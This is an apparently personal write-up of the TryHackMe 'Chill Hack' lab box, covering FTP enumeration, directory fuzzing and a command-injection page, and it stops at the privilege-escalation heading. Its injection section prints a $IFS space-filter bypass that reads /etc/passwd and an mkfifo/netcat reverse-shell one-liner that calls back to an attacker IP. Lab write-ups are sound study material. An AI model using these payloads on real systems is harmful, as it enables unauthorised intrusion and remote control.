### Chill hack
### Difficulty = easy
### Os = linux
### [LINK](https://tryhackme.com/room/chillhack)

Hi guys ,
<br> let's root another fun box today.
<br> let's get started.

<h2>Nmap scan</h2>

![nmap](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a3a34c1a-56e5-4c8b-b7ac-b05149c8fa2b)

As you can see we have 3 open ports which port 21(FTP) Allows anonymous login.
<br> so let's enumerate the port further by connecting to the ftp server using "anonymous" as username and hitting enter to get logged in. Then download the file on the server to your local machine

![anonymousftp](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/49303fe2-cdba-459b-b3d2-4a7476fb7ecc)
<br> so, let's check the content of the downloaded file

![note](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e36502ad-edc5-4183-9125-e2347c83f7ee)

the file contains hint to the box.

<br> let's proceed further by fuzzing for directories using ffuf
~~~
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.85.120/FUZZ
~~~

![fuzz](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e6bce9a6-9f52-4e85-975a-9f959b1a6b73)

got the directory */secret*
<br> visiting the directory we can tell that the box is about command injection

![http_command_inj_page](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e6568236-8929-4d80-ae25-fff0fd4ab7ec)
<br> so, you can confirm it by executing the **id** command

proceeding further we noticed that our commands ain't working due to some kinda filters
 
 ![filter](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/01e4e271-345e-4135-b128-838ec0d753d5)

i found out that spaces get filtered and thereby triggering the alert.

<br> so, let's bypass the filter using the "internal field separator" $IFS
```
cat$IFS/etc/passwd should work
```

![filer_bypass](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/8ab2e700-3c52-440b-9e9a-aa732477c14c)

dope! it has been bypassed. which means we have to replace the spaces with $IFS 

<br> let's pop our sweet reverse shell by starting netcat listener and executing this commands.
```
rm$IFS/tmp/f;mkfifo$IFS/tmp/f;cat$IFS/tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f
```
![rev-shell](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/760a62df-4925-44ae-b577-07654cb8fa56)

<br> cool we have a shell xD
<br> so, stabilize the shell.

<h2>Privilege escalation</h2>

